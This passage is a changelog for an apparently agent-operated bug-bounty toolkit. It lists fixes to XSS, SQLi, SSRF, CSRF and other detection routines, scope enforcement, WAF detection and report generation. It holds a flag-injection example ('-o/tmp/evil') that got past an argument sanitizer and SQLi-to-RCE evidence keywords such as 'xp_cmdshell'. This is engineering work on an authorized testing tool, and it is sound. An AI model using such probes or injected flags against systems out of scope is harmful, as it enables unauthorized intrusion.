- `_WAF_BODY_SIGNATURES`: 10 signatures — `"blocked"`, `"waf"`, `"firewall"`, `"cloudflare"`, `"akamai"`, `"incapsula"`, `"sucuri"`, `"mod_security"`, `"request blocked"`, `"security policy"`
- `_detect_waf(responses)`: requires ≥3 responses, then two detection paths:
  1. All responses have blocking status codes AND ≤2 unique response bodies AND at least one contains a WAF signature
  2. Every response contains a WAF signature regardless of status code

Design note: the plan's original signature list included `"forbidden"`, `"access denied"`, and `"not acceptable"` — these were dropped because they appear in normal 403 responses without any WAF being present. The conservative list reduces false positives.

### UPDATED — All 11 vuln test functions

Applied uniformly at the end of each test function:

```python
waf_detected = not vulnerable and _detect_waf(collected_responses)
```

The `not vulnerable` guard ensures that if a payload succeeded past the WAF, the signal is not set — the agent should report the finding, not retry with bypass payloads.

Affected functions: `test_idor`, `test_ssrf`, `test_xss`, `test_sqli`, `test_auth`, `test_race`, `test_redirect`, `test_csrf`, `test_mass_assign`, `test_reset`, `test_ai`.

---

## 0.5.0 — Documentation & Agent Readiness

**Date:** 2026-04-05
**Scope:** Documentation milestone. Full codebase audit against product vision, new agent orientation guide, V4 implementation plan, README and TLDR updated. 0 code changes, 0 regressions (592 tests pass).

After completing V1 (recon/enumeration), V2 (browser/HTTP interaction + 5 vuln tools), V3 (analysis/chaining/reporting + 6 more vuln tools), and 12 production-hardening releases (0.3.1–0.4.2), the framework was assessed at 8.5+/10 production-ready with 592 passing tests. This release marks the transition from building to using — preparing the toolkit for its first real-world bug bounty engagement.

### Codebase Audit vs. Product Vision

Systematic 5-agent parallel audit of the entire codebase against every capability in `docs/product-vision.md`. Results:

| Phase | Capabilities | Implemented | Coverage |
|---|---|---|---|
| V1 — Recon & Enumeration | 14 | 7 | 50% |
| V2 — Interaction & Testing | 26 | 22 | 85% |
| V3 — Analysis & Reporting | 12 | 9 | 75% |
| V4 — Autonomy | 8 | 0 | 0% |
| **Total** | **60** | **38** | **63%** |

**Key finding:** V1–V3 delivers a complete end-to-end pipeline (discover → interact → test → analyze → report). The 37% gap is split between recon breadth (7 missing discovery capabilities), platform API submission (3 capabilities), program selection (4 capabilities), and infrastructure management (4 capabilities). The latter three categories are intentionally deferred — Boba remains a toolkit, not an autonomous platform.

### NEW — Agent Orientation Guide

> `docs/agent-orientation.md`

Field manual for agents operating Boba. Not developer docs — an operator's manual covering:

- External tool installation table (9 binaries, exact install commands)
- Complete 7-phase hunt workflow with exact CLI commands for every step
- All 48+ CLI commands documented with real flags and usage patterns
- 11 vulnerability test tools with full flag reference
- Decision-making heuristics: what to test first based on recon results, how to prioritize, what to do when stuck
- Post-testing checklist: dedupe → score → chain → coverage gaps → report

### NEW — V4 Implementation Plan

> `docs/executing/v4-implementation-plan.md`

Closes the recon breadth gap (7 → 14 capabilities). 3 phases ordered by impact:

- **Phase 1 (CRITICAL):** Parameter discovery via Arjun adapter — feeds all 11 existing vuln test tools with hidden query/body/header params they can't currently find
- **Phase 2 (HIGH):** GitHub secret scanning via gitleaks adapter + API surface mapping via Kiterunner adapter
- **Phase 3 (MEDIUM):** GraphQL introspection, ASN/IP range enumeration, cloud bucket discovery — all Python-native (no external binary), using existing HttpClient

Defines 6 new SQLite tables (parameters, secrets, api_endpoints, graphql_schemas, ip_ranges, cloud_buckets), 3 new adapters, integration points with existing analysis/coverage/prioritization, and ~105 estimated new tests.

### Updated — README.md

- Logo size increased (200px → 320px)
- Added "Agent Guide" link to navigation bar
- Quickstart: updated to show full pipeline (recon → test → analyze → chain → report) with accurate CLI syntax
- "What It Does": expanded from 3 sections to 6 — added Analysis & Intelligence, Reporting descriptions; expanded Vulnerability Testing from 5 to 11 detection engines; Persistence updated from "every entity" to "17 tables" with full list
- Test count: 206 → 592
- Roadmap: V3 checked off; V4 updated from "autonomous hunt loops" to "recon breadth"

### Updated — docs/tldr.md

- Version: v0.2.11 → v0.4.2
- Vuln tools: "Five" → "Eleven" with full list
- Added analysis layer and reporting layer descriptions
- Quality passes: 11 → 24+; tests: 206 → 592
- V4 description aligned with implementation plan

---

## 0.4.2 — Prod Gate: Confidence Accuracy & Report Integrity

**Date:** 2026-04-05
**Scope:** 4 fixes across vuln detection, reporting, persistence. 0 regressions (592 tests pass).

Full 5-agent parallel codebase review (core, adapters, interaction/vuln, analysis/reporting/CLI, test suite). Assessed ~60 raw findings, dismissed ~56 as non-issues (target injection requires attacker control of scope engine output, OOB substring collision impossible with uuid4 hex IDs, dynamic SQL uses hardcoded table constants, cross-host chain first-match is by design, JSON body similarity comma split is intentional heuristic). Post-fix assessment: 8.5+/10 production-ready.

### HIGH — Auth Test Confidence Inverted

1. **`test_auth` confidence values were backwards** (`vuln.py:943`) — When no session was provided (weaker evidence — cannot A/B compare authenticated vs unauthenticated responses), confidence was set to `LIKELY`. When a session was provided (stronger evidence — proper baseline comparison), confidence was `POSSIBLE`. This is inverted: stronger evidence should produce higher confidence. The existing unit test encoded the buggy behavior with a matching incorrect comment. Fixed: flipped the condition so session-backed findings get `LIKELY` and session-less findings get `POSSIBLE`. Updated test assertion and comment.

### MEDIUM — PoC File Numbering Desync (2 paths)

2. **PoC HTTP dump files had gaps and mismatched numbering** (`poc.py:78-87`) — `enumerate(request_ids, 1)` incremented the file counter even when `get_http_record()` returned `None` (missing record) or `write_text()` raised `OSError` (disk error). Files were numbered `001, 003, 004` with gaps, but the `http_dumps` list had no gaps — the mapping between filenames and list entries broke. Users got PoC packages where `002_request.http` contained a different request than what the README referenced. Fixed: replaced `enumerate` with a manual `file_num` counter that only increments on successful record retrieval and decrements on write failure.

### MEDIUM — Bugcrowd Formatter Empty Steps Section

3. **Single-step reports produced empty "Steps to Reproduce" in Bugcrowd format** (`formatter.py:99-102`) — When `has_location=True` and the report had exactly one step, `report.steps[1:]` was empty. The sole step was consumed as the Location header with nothing left for the Steps section. Fixed: added `len(report.steps) > 1` guard so single-step reports keep their step visible instead of producing an empty section.

### LOW — Missing FK CASCADE on dedup_groups and reports

4. **`dedup_groups.canonical_id` and `reports.finding_id/chain_id` lacked ON DELETE CASCADE** (`context.py:363, 397-398`) — These foreign keys referenced `findings(id)` and `chains(id)` without cascade. While no `delete_finding()` method exists today, any future deletion of individual findings would produce `FOREIGN KEY constraint failed` errors from orphaned references. Fixed: added `ON DELETE CASCADE` to all three FK constraints to match the pattern used by all other FK references in the schema.

---

## 0.4.1 — Prod Gate: Detection Correctness & ID Integrity

**Date:** 2026-04-05
**Scope:** 11 fixes across vuln detection, persistence, analysis, adapters. 0 regressions (592 tests pass).

5-agent parallel codebase review (core, adapters, interaction/vuln, analysis/reporting, test coverage). Verified all findings against actual code before fixing. Dismissed COALESCE host upsert concern after confirming adapters return `""` (not NULL) for missing text fields. Post-fix assessment: 8.5+/10 production-ready.

### CRITICAL — Redirect Detection Completely Broken

1. **`test_redirect` always returned `vulnerable=False`** (`vuln.py:1259`) — `http_client.request()` used the default `follow_redirects=True`. The response seen by detection logic was the **final** response after all redirects (typically HTTP 200), so the `status_code in (301, 302, ...)` check at line 1276 never matched. Unit tests passed because they mock `client.request` to return a fabricated 302 directly. Fixed: now passes `follow_redirects=False` so the raw 3xx response is inspected.

### HIGH — Upsert ID Integrity

2. **`lastrowid` returned 0/undefined on upsert-update path** (`context.py`, 5 methods) — SQLite's `last_insert_rowid()` is undefined when `INSERT ON CONFLICT DO UPDATE` takes the update path. All upsert methods returned `cursor.lastrowid or 0`, which produced `0` on updates. Callers use the return value: `draft.id = context.upsert_report(...)`, `chain.id = context.upsert_chain(...)`, `return context.upsert_finding(...)`. Fixed: new `_resolve_upsert_id()` helper falls back to a SELECT on the unique-key columns when `lastrowid` is falsy. Applied to `upsert_finding`, `upsert_chain`, `upsert_report`, `upsert_coverage`, and `insert_dedup_group`. Note: `log_tool_run`, `insert_http_record`, and `insert_oob_listener` use plain INSERT (no ON CONFLICT) so `lastrowid` is always valid — left unchanged.

### MEDIUM — Detection & Analysis Correctness (5 issues)

3. **`check_duplicate` suppressed distinct vuln types at same URL** (`dedup.py:236`) — The exact URL+method+param match did not check `finding_type`, so an XSS and an IDOR at the same endpoint were flagged as duplicates. The host-level match at line 244 correctly checked type, but the exact-URL match didn't. Fixed: added `and ef_type == ftype` to the condition.

4. **DOM XSS check exited early due to shared `vulnerable` flag** (`vuln.py:633`) — If reflected XSS set `vulnerable=True`, the DOM XSS param loop immediately broke after the first param iteration regardless of whether the DOM canary fired. DOM XSS on non-first parameters was never tested. Fixed: introduced `dom_found` flag; the outer loop now breaks on `dom_found` instead of the shared `vulnerable`.

5. **Chain report steps in wrong order** (`draft.py:124`) — `draft_chain_report` iterated `finding_ids` (sorted by database ID, an artifact of insertion order) instead of `chain_order` (the intended attack sequence). A redirect→SSRF chain with lower SSRF ID would produce reversed reproduction steps. Fixed: now uses `chain_order` with fallback to `finding_ids`.

6. **`xss_session_hijack` chain fired on ALL XSS findings** (`chaining.py:92`) — `evidence_keywords` included XSS type labels ("reflected", "dom_based", "stored") which appear in every XSS finding's evidence. Every XSS triggered a false "session hijack" chain. Fixed: removed type labels, now requires session-specific evidence ("cookie", "session", "httponly_false", "document.cookie", "set-cookie").

7. **`sqli_to_rce` chain fired on any confirmed SQLi** (`chaining.py:65`) — `evidence_keywords` included standard detection methods ("error_based", "time_based", "boolean_based"), so every confirmed SQLi was promoted to CRITICAL "RCE" regardless of actual RCE evidence. Fixed: now requires RCE-specific evidence ("stacked_queries", "file_write", "xp_cmdshell", "into_outfile", "load_file", "os_command").

### LOW — Adapter Hardening (4 issues)

8. **`_sanitize_extra_args` bypass via concatenated short flags** (`base.py:278-298`) — `-o/tmp/evil` bypassed the sanitizer because it wasn't an exact match for `-o` and didn't contain `=`. Fixed: added prefix match for short flags (1-3 chars after dash) so `-o<anything>` is caught.

9. **Nuclei `tags` always empty** (`nuclei.py:79`) — Nuclei sends tags as a comma-separated string (e.g., `"cve,rce,critical"`), not a list. The `isinstance(..., list)` guard discarded them. Fixed: parses CSV string into list when tags is a string.

10. **httpx `status_code`/`content_length` not type-coerced** (`httpx_runner.py:64,68`) — Unlike `port` which gets `_safe_int()`, these numeric fields were passed through raw. If httpx returned them as strings, downstream integer comparisons would fail. Fixed: both now use `_safe_int()`.

11. **Race condition scope-skip used wrong `test_type`** (`vuln.py:1097`) — The scope-skip early return used `test_type="race_condition"` while the normal result path and coverage recording used `"race"`. Fixed: unified to `"race"`.

---

## 0.4.0 — Prod Gate: Final Boundary Safety & Cache Consistency

**Date:** 2026-04-05
**Scope:** 6 fixes across session management, adapters, core persistence. 0 regressions (592 tests pass).

4-agent parallel codebase review (core, adapters, tools/CLI/interaction/analysis, test suite). Focused on type safety at tool output boundaries, cache coherence, and migration resilience. Reviewed and dismissed ~30 findings as non-issues (OOB poll already has deadline, migration already atomic via `with self._conn:`, `lastrowid or 0` callers don't depend on return, SQL f-string table names are whitelist-controlled). Post-fix assessment: 8.5/10 production-ready.

### BUG — Session Cache Staleness

1. **`invalidate()` left stale `valid=True` in cache** (`session.py:204-208`) — `invalidate()` called `_get_or_raise()` which returns a deep copy from cache, so `state.is_valid = False` modified the copy and `_persist()` wrote to DB, but the original cached object stayed `is_valid=True`. Any subsequent `get()` or `apply_to_headers()` returned the stale valid session. Fixed: cache entry is now updated after persist. Note: `delete()` already did this correctly via `self._cache.pop()`.

### MEDIUM — Type Safety at Parse Boundaries (3 issues)

2. **Nuclei `reference`/`tags` accepted non-list values** (`nuclei.py:78-79`) — `info.get("reference") or []` passed through truthy non-list types (string URL, dict). Downstream code iterating these fields as lists would crash or produce wrong results. Fixed: explicit `isinstance(..., list)` guard, falls back to `[]`.

3. **httpx `tls_version` could be `None`** (`httpx_runner.py:57`) — When httpx returned `{"tls": {"version": null}}`, `.get("version", "")` returned `None` (key exists, value is null), not the default `""`. Downstream string operations on the field would fail. Fixed: `(tls.get("version") or "")` coerces `None` to empty string.

4. **WhatWeb `version`/`detail` could be `None`** (`whatweb.py:51-55`) — If whatweb returned `{"version": [null]}`, `versions[0]` stored `None` in the technology record. Fixed: explicit `str(v) if v is not None else ""` coercion.

### LOW — Defensive Hardening (2 issues)

5. **Evidence serialization used falsy catch-all** (`context.py:1239-1245`) — The `if finding.get("evidence")` condition treated any falsy evidence (empty string `""`, integer `0`) the same as `None`, silently dropping it. Fixed: explicit `is None` check so only truly absent evidence becomes `[]`.

6. **Migration recovery guard for `_findings_old` table** (`context.py:449+`) — While SQLite WAL journaling ensures the migration transaction is atomic, a leftover `_findings_old` table from manual DB edits or external corruption could confuse startup. Added: pre-migration check that detects and cleans up orphaned temp tables before proceeding.

### Reviewed & Confirmed Safe (no fix needed)

- **SQL injection in `get_hunt_stats()`** — table names interpolated via f-string but controlled by `_STATS_TABLES` frozenset (whitelist). Safe.
- **OOB poll() timeout** — `poll()` uses `time.monotonic() + timeout_seconds` deadline internally. Not missing a timeout.
- **Migration atomicity** — `with self._conn:` is SQLite's transaction context manager; interrupted migrations roll back via WAL journal.
- **Thread safety** — documented single-threaded design, enforced by sqlite3 `check_same_thread=True`.
- **`lastrowid or 0` pattern** — all call sites verified; no caller relies on return value to detect skipped inserts.

---

## 0.3.9 — Prod Gate: Data Consistency & API Contract Fixes

**Date:** 2026-04-05
**Scope:** 7 fixes across analysis, reporting, and adapters. 0 regressions (592 tests pass).

5-agent parallel codebase review for final production gate assessment. Reviewed core layer, adapter layer, interaction/vuln layer, analysis/reporting layer, and full test suite (592 tests). Filtered ~60 raw findings down to 7 real issues — dismissed 50+ false positives (thread safety in documented single-threaded design, SQL injection in hardcoded column names, CSRF urlencode that correctly uses `doseq=True`, migration atomicity already handled by context manager). Post-fix assessment: 8.5/10 production-ready.

### MEDIUM — Must-Fix (5 issues)

1. **`check_duplicate()` returned incomplete `finding_ids`** (`dedup.py:237-241, 252-256`) — `DedupeGroup.finding_ids` only contained the existing finding's ID, not the new finding being checked. This broke the API contract that a `DedupeGroup` represents ALL members of the group. Fixed: both the existing and new finding IDs are now included (sorted, deduplicated).

2. **Report drafts never populated `evidence_refs`** (`draft.py:67-80`) — The `evidence_refs` field defaulted to `[]` and was never set. The formatter checks `if report.evidence_refs:` to render the "Supporting Material/References" section, so it was always skipped. Fixed: new `_build_evidence_refs()` helper extracts notes from the finding's evidence array and populates the field.

3. **PoC HTTP dumps produced malformed response lines for non-standard status codes** (`poc.py:159-165`) — When `status_code` was 0 (network error) or any unlisted code, `_REASONS.get(status, "")` returned an empty string, producing `"HTTP/1.1 0 "` — invalid HTTP that breaks PoC artifact usability. Fixed: default reason is now `"Unknown Status"`, and `.rstrip()` removed to preserve consistent formatting.

4. **HttpxRunner stored hostname in `ip` field on DNS failure** (`httpx_runner.py:55`) — When `a_records` was an empty list (DNS resolution failed), the fallback `raw.get("host", "")` returned the input hostname, storing it in the `ip` field. Downstream IP-based scope filtering and reporting would get hostnames where they expect IPs. Fixed: fallback is now `""` (empty string), consistent with "unknown" semantics.

5. **Nuclei `extracted_results` accepted non-list values** (`nuclei.py:75`) — `raw.get("extracted-results") or []` would pass through any truthy non-list (string, dict) from unexpected Nuclei output. Downstream code iterating `extracted_results` as a list would crash. Fixed: explicit `isinstance(..., list)` check.

### LOW — Hardening (2 issues)

6. **Chain confidence preservation key used `str(sorted(list))`** (`chaining.py:179-185`) — The key for matching old chain confidence relied on Python's string representation of sorted integer lists (`"[100, 200, 300]"`). While functionally correct, this is fragile and unconventional. Fixed: key is now `tuple(sorted(...))`, which is hashable, immutable, and semantically correct.

7. **HttpxRunner port returned `None` vs naabu's `0`** (`httpx_runner.py:61`) — HttpxRunner returned `None` for missing port, while NaabuAdapter returned `0`. Consumers had to handle both sentinel values. Fixed: httpx now uses `_safe_int(...) or 0`, matching naabu's convention.

### Test updates

- `test_adapters.py::TestHttpxRunnerAdapter::test_parse_record_minimal` — Updated: `port` now asserts `== 0` (was `is None`).
- `test_fixes_0217.py::TestHttpxRunnerTypeGuard::test_a_field_is_string` — Updated: `ip` now asserts `== ""` (was `== "example.com"` — the old test was asserting the *bug's* behavior).

---

## 0.3.8 — Pre-Prod: Data Integrity & Security Hardening

**Date:** 2026-04-05
**Scope:** 10 fixes across core persistence, adapters, tools, and analysis. 0 regressions (592 tests pass).

4-agent parallel codebase review for final production readiness assessment. Reviewed core layer (scope, context, models), adapter layer (all 9 adapters + base), tools + CLI, V3 features, and full test suite (592 tests). Filtered to 10 real issues — 5 MEDIUM, 5 LOW. Post-fix assessment: 8.5/10 production-ready.

### MEDIUM — Must-Fix (5 issues)

1. **Finding evidence stored `"null"` string instead of `"[]"`** (`context.py:1241-1247`) — When a finding had no evidence, `json.dumps(None)` produced the string `"null"`, not SQL NULL or `"[]"`. Any SQL query using `evidence IS NULL` wouldn't match these rows. Fixed: empty evidence now stores `"[]"` (empty JSON array) for consistent representation.

2. **Migration used manual `BEGIN`/`COMMIT` inside Python's implicit transaction management** (`context.py:452-497`) — `_maybe_migrate()` called `self._conn.execute("BEGIN")` directly, relying on undocumented `executescript` auto-commit behavior. Could break on Python/SQLite version upgrades. Fixed: replaced with `with self._conn:` context manager, matching the pattern used everywhere else in the codebase.

3. **Report upsert allowed both `finding_id` and `chain_id` to be NULL** (`context.py:1706-1708`) — SQLite treats NULL as distinct in UNIQUE constraints, so `UNIQUE(hunt_id, finding_id, chain_id)` wouldn't prevent duplicates when both were NULL. Fixed: `upsert_report()` now raises `ValueError` if neither is provided. Test updated to provide a valid finding_id.

4. **Stored XSS scored identically to reflected XSS** (`severity.py:169-173`) — The stored XSS refinement set `attack_complexity="L"` but that was already the default, producing identical CVSS scores (6.1). The test used `>=` so the bug was masked. Fixed: stored/DOM XSS now sets `user_interaction="N"` (no victim click needed for persisted payload), producing a meaningfully higher score (8.2 vs 6.1).

5. **`extra_args` flag injection in all adapters** (`base.py` + all 9 adapters) — `config.extra_args` was appended last to subprocess commands. CLI tools with last-wins semantics allowed callers to override adapter-controlled flags (e.g., `-o /tmp/evil` to redirect output). Fixed: new `_sanitize_extra_args()` classmethod in `BaseAdapter` strips output-redirect flags (`-o`, `--output`, `-oJ`, `--json`, `--log-file`, etc.) before command construction, with warning logs for stripped flags.

### LOW — Hardening (5 issues)

6. **Missing `source` on port upserts** (`tools/recon.py:96`) — `upsert_records()` for naabu results omitted `source="naabu"`, breaking provenance tracking. Fixed.

7. **Missing `source` on directory upserts** (`tools/enum.py:41`) — Same pattern: `upsert_records()` for ffuf results omitted `source="ffuf"`. Fixed.

8. **Hunt ID collision with no retry** (`hunt.py:40`) — `uuid4().hex[:12]` (48-bit entropy) has ~50% collision chance at ~16M hunts. The `INSERT` would fail with an unhandled `IntegrityError`. Fixed: retry loop (3 attempts) with clean `RuntimeError` on exhaustion.

9. **CIDR-with-port misclassified as subdomain** (`scope.py:257`) — When target was `10.0.0.0:8080/24`, port stripping produced `cleaned="10.0.0.0"` but the CIDR path passed the original `target` (with port) to `ip_network()`, causing parse failure and fallback to `"subdomain"`. Fixed: CIDR path now uses `cleaned` consistently.

10. **Naabu port=0 fallback** — Preserved existing behavior (`_safe_int(raw.get("port")) or 0`) after analysis confirmed port 0 is a safe sentinel for missing data. No change needed; documented as reviewed.

### Test updates

- `test_cli_report.py::TestCLIReportList::test_list_reports` — Updated to create a finding before creating a report (matching new validation that reports must reference a finding or chain).

---

## 0.3.7 — Production Hardening: Error Visibility

**Date:** 2026-04-05
**Scope:** 5 fixes across core persistence, subprocess, and vuln tools. 0 regressions (592 tests pass).

3-agent parallel codebase review for production readiness assessment. Filtered ~50 raw findings down to 5 real issues (dismissed 10+ false positives — e.g., "SQL injection" in hardcoded column names, "thread safety" in documented single-threaded design). Theme: silent failures that mask real problems in production — errors logged too quietly, missing binaries crashing with tracebacks, invalid hunt IDs returning empty results instead of errors, and WAL mode failures going unnoticed. Post-fix score: 9/10.

### Tier 1 — Must-Fix (3 issues)

1. **`_persist_finding()` swallowed DB errors at WARNING level** (`vuln.py:110-111`) — When a vulnerability was detected but the database write failed (e.g., disk full, schema mismatch), the finding was silently lost. The test reported `vulnerable=True` but nothing was persisted. Promoted to `logger.error()` with explicit "NOT persisted" message so operators can detect data loss in production logs.

2. **`run_subprocess()` crashed with raw traceback on missing binaries** (`subprocess.py:48-54`) — If a tool (subfinder, naabu, etc.) was not installed or lacked execute permissions, `asyncio.create_subprocess_exec()` raised `FileNotFoundError` or `PermissionError` with no context. Now catches both and returns a structured `SubprocessResult` with exit code 127 (not found) or 126 (permission denied) — matching POSIX shell conventions. Adapters handle this gracefully via their existing non-zero exit code path.

3. **Context query methods returned empty results for invalid hunt IDs** (`context.py:835-910`) — `get_subdomains()`, `get_hosts()`, `get_ports()`, `get_urls()`, `get_technologies()`, `get_directories()`, and `get_tool_runs()` silently returned `[]` for non-existent hunt IDs. Added `_ensure_hunt()` validation that raises `HuntNotFoundError` — consistent with `get_hunt()` behavior and surfaced clearly in the CLI.

### Tier 2 — Should-Fix (2 issues)

4. **`_record_coverage()` logged failures at DEBUG level** (`vuln.py:79-80`) — Coverage write failures were invisible unless running with `--log-level debug`. Promoted to `logger.warning()` so production operators see coverage gaps without enabling verbose logging.

5. **WAL mode failure silently fell back to DELETE journal mode** (`context.py:425-427`) — If SQLite couldn't enable WAL mode (read-only filesystem, permissions issue), it logged a warning and continued with the slower, less concurrent-friendly DELETE journal mode. This could cause `SQLITE_BUSY` errors during parallel adapter runs that would be very hard to diagnose. Now raises `RuntimeError` with actionable message about checking permissions and disk space.

### Regression tests (`tests/test_fixes_0218.py` — 13 new tests)

- `TestVulnPersistenceLogging` (2 tests) — Verify `_persist_finding` logs at ERROR, `_record_coverage` at WARNING
- `TestSubprocessMissingBinary` (2 tests) — Verify exit 127 for missing binary, exit 126 for permission denied
- `TestContextQueryValidation` (8 tests) — Verify HuntNotFoundError on all 7 query methods + normal queries still work
- `TestWALModeEnforcement` (1 test) — Verify RuntimeError when WAL mode cannot be enabled

---

## 0.3.6 — Data Integrity & Detection Accuracy

**Date:** 2026-04-05
**Scope:** 7 fixes across core persistence, vuln testing, and CLI layers. 0 regressions (579 tests pass).

4-agent parallel codebase review for final production gate. Filtered ~40 raw findings down to 7 real, actionable issues. Focused on data integrity (upsert NULL overwrites), detection accuracy (false positives/negatives), and operational robustness. Post-fix score: 8.5+/10.

### Tier 1 — Must-Fix (5 issues)

1. **`upsert_port()` unconditionally overwrote IP with NULL on re-scan** (`context.py:678`) — When a port was re-scanned by a tool that didn't provide IP information, the existing IP address was permanently lost. Changed `ip = excluded.ip` to `ip = COALESCE(excluded.ip, ports.ip)` so existing data is preserved when the new value is NULL.

2. **`upsert_directory()` unconditionally overwrote 6 metadata fields** (`context.py:783-788`) — Re-discovery with partial metadata (e.g., a different tool) permanently wiped `status_code`, `content_length`, `word_count`, `line_count`, `content_type`, and `redirect_location`. All 6 fields now use `COALESCE(excluded.*, directories.*)` to preserve existing values when new data is NULL.

3. **`test_race()` flagged benign status variance as LIKELY vulnerability** (`vuln.py:1145`) — Any status code divergence (including 304 Not Modified from caching, 429 from rate limiting, and load balancer jitter) triggered a LIKELY confidence race condition. Now filters out benign status codes (304, 429) before checking divergence. Additionally, when both status codes AND response bodies diverge, confidence is upgraded to CONFIRMED — providing a two-signal confirmation that prior versions lacked.

4. **`test_mass_assign()` silently discarded all evidence on non-JSON responses** (`vuln.py:1544`) — The bare `except (ValueError, TypeError): pass` handler meant that mass assignment testing on endpoints returning HTML (error pages, redirects, SSR apps) produced zero evidence and zero logs. Added `logger.warning()` with the URL and exception details, plus a `parse_error` evidence entry so the finding is visible in reports and agents know to retry or escalate.

5. **`test_xss()` outer break skipped remaining params for both reflected and DOM checks** (`vuln.py:606-610`) — Finding reflected XSS on parameter A exited the entire outer loop, preventing reflected testing on param B and all DOM-based testing (guarded by `not vulnerable`). Removed the outer `break` and the `not vulnerable` guard on the DOM check. Now all parameters are tested for reflected XSS, and DOM-based testing runs regardless of reflected results since DOM XSS on a different parameter is a distinct finding.

### Tier 2 — Should-Fix (2 issues)

6. **`upsert_finding()` unconditionally overwrote severity/title/description** (`context.py:1201-1203`) — A re-upsert with NULL severity (e.g., from a different tool run with less context) replaced a previously scored finding's metadata. Changed to `COALESCE(excluded.*, findings.*)` for `severity`, `title`, and `description`, consistent with how `confirmed` and `false_positive` already use `MAX()` to preserve the strongest signal.

7. **`json.dump` to stdout crashed on piped output** (`formatters.py:41`) — Running `boba context urls HUNT | head -1` produced an ugly `BrokenPipeError` traceback. Added `try/except BrokenPipeError` with clean `SystemExit(0)`, following the standard Python pattern for CLI tools that pipe to `head`/`less`.

---

## 0.3.5 — Final Prod Gate

**Date:** 2026-04-05
**Scope:** 15 fixes across core, adapters, interaction, tools/vuln, and analysis layers. 0 regressions (579 tests pass).

6-agent parallel review of all layers for final production gate. Pre-fix score: 7.5/10. Post-fix target: 8.5+. Concentrated on scope enforcement gaps (the framework's #1 safety invariant), data integrity in persistence/analysis, and false-positive reduction in vuln testing.

### Tier 1 — Must-Fix (5 issues)

1. **`upsert_report` silently created duplicate reports** (`context.py:1599`) — `ON CONFLICT(hunt_id, finding_id, chain_id)` fails when either `finding_id` or `chain_id` is NULL because SQLite treats NULL as distinct in UNIQUE constraints. Finding-only and chain-only reports (the common case) duplicated on every upsert. Split into three code paths targeting the appropriate partial index: `ON CONFLICT(hunt_id, finding_id) WHERE chain_id IS NULL` for finding-only, `ON CONFLICT(hunt_id, chain_id) WHERE finding_id IS NULL` for chain-only, and the table-level constraint for both-set.

2. **`check_duplicate()` matched finding against itself** (`dedup.py:223`) — No self-exclusion in the loop, so any persisted finding was immediately flagged as its own duplicate. Added `if finding_id is not None and ef["id"] == finding_id: continue` guard.

3. **`detect_chains()` destroyed validated chain confidence + left stale chains** (`chaining.py:174-190`) — Re-running detection deleted all chains (including VALIDATED ones) then re-inserted with HYPOTHETICAL confidence. Also, if re-run found zero chains, stale chains persisted. Fix: always delete old chains; before re-inserting, check if the same chain (by sorted finding_ids) was previously VALIDATED, and preserve that confidence.

4. **10 of 12 vuln test functions lacked scope enforcement** (`vuln.py`) — Only `test_idor` checked scope. `test_ssrf`, `test_xss`, `test_sqli`, `test_auth`, `test_race`, `test_redirect`, `test_csrf`, `test_mass_assign`, `test_reset`, and `test_ai` would fire payloads at out-of-scope targets — violating the framework's "defensive by default" invariant. Added `scope_engine: Any | None = None` parameter and entry check to all 10 functions.

5. **`test_xss`/`test_sqli`/`test_auth` finding persistence omitted parameter name** (`vuln.py:635,864,1007`) — The findings UNIQUE key includes `parameter`, but it was always empty string. A second finding on the same URL (different param) overwrote the first, losing data. Now passes comma-joined parameter names to `_persist_finding`.

### Tier 2 — Should-Fix (10 issues)

6. **`json_array_merge` accumulated duplicate evidence entries** (`context.py:58-61`) — Repeated upserts grew `evidence` and `request_ids` arrays unboundedly with duplicate items. Added deduplication via JSON-normalized set membership check.

7. **Migration used `executescript` without transaction wrapping** (`context.py:434`) — `executescript` implicitly commits before running, so an interrupted migration (rename → create → copy → drop) could leave the database in an inconsistent state with `_findings_old` existing. Replaced with explicit `BEGIN`/`COMMIT`/`ROLLBACK` around individual `execute()` calls.

8. **`process.wait()` after stream drain had no timeout** (`subprocess.py:94`) — A zombie process that closes pipes but doesn't exit would hang indefinitely. Added 10-second timeout with kill fallback.

9. **`test_csrf` cross-origin test sent original body** (`vuln.py:1319`) — Test 3 (cross-origin) used `body=body` (with valid CSRF tokens) instead of `body=clean_body`. The valid token masked whether the server actually enforced Origin checks. Changed to `clean_body`.

10. **`test_sqli` time-based loop ignored deadline** (`vuln.py:781-847`) — Error/boolean loops checked `_deadline`, but the time-based phase (15s × N payloads × N DB types) had no deadline check. Could run 10+ minutes past `max_test_seconds`. Added deadline checks before the time-based phase and inside the payload loop.

11. **`test_auth` flagged public endpoints as CONFIRMED vulnerable** (`vuln.py:899-908`) — Any 200 response without auth was marked `vulnerable=True, confidence=CONFIRMED`, catching health checks and login pages. Now: without a session to compare against, only admin-like endpoints are flagged (LIKELY). With a session, compares authed vs unauthed responses — different content confirms the endpoint is auth-aware but unenforced (CONFIRMED).

12. **Dedup Signal 1a merged different vuln classes** (`dedup.py:123`) — Key was `(url, method, param)` without `finding_type`, so an XSS and IDOR on the same endpoint merged as duplicates. Added `ftype` to the key.

13. **Reflected XSS underscored by ~1.1 CVSS points** (`severity.py:174`) — `attack_complexity=H` double-penalized reflected XSS (industry norm: AC:L with UI:R). Dropped the AC override for non-stored/non-DOM XSS; `UI:R` already captures the user-interaction requirement.

14. **Fuzz baseline stripped markers to empty strings** (`http.py:289-294`) — `§id§` became `//` in URLs, producing invalid baselines that skewed anomaly detection. Now substitutes the first payload value per position, keeping the baseline URL/body structurally valid.

15. **OOB manager assumed Interactsh client is async** (`oob.py:51,130`) — `await client.deregister()` and `await client.poll()` would crash if the real Interactsh package exposes sync methods. Added `asyncio.iscoroutine()` check; calls `await` only on actual coroutines.

---

## 0.3.4 — Prod Readiness Review

**Date:** 2026-04-02
**Scope:** 9 fixes across core, adapters, tools, analysis, and reporting layers. 0 regressions (579 tests pass).

4-agent parallel review of all layers for final production gate. Scored 7.5/10 pre-fix, targeting 8.5+. Triaged findings into 4 must-fix and 5 should-fix issues. No fundamental architecture problems found — issues concentrated in edge-case handling and V2/V3 persistence gaps.

### Tier 1 — Must-Fix (4 issues)

1. **Chain deletion data loss prevented** (`chaining.py:175`) — `detect_chains()` called `context.delete_chains(hunt_id)` unconditionally before checking if new chains were found. When detection returned zero chains (e.g., findings modified between runs), all previously detected chains were permanently deleted. Moved `delete_chains()` inside the `if chains:` block so deletion only occurs when replacement chains are ready.

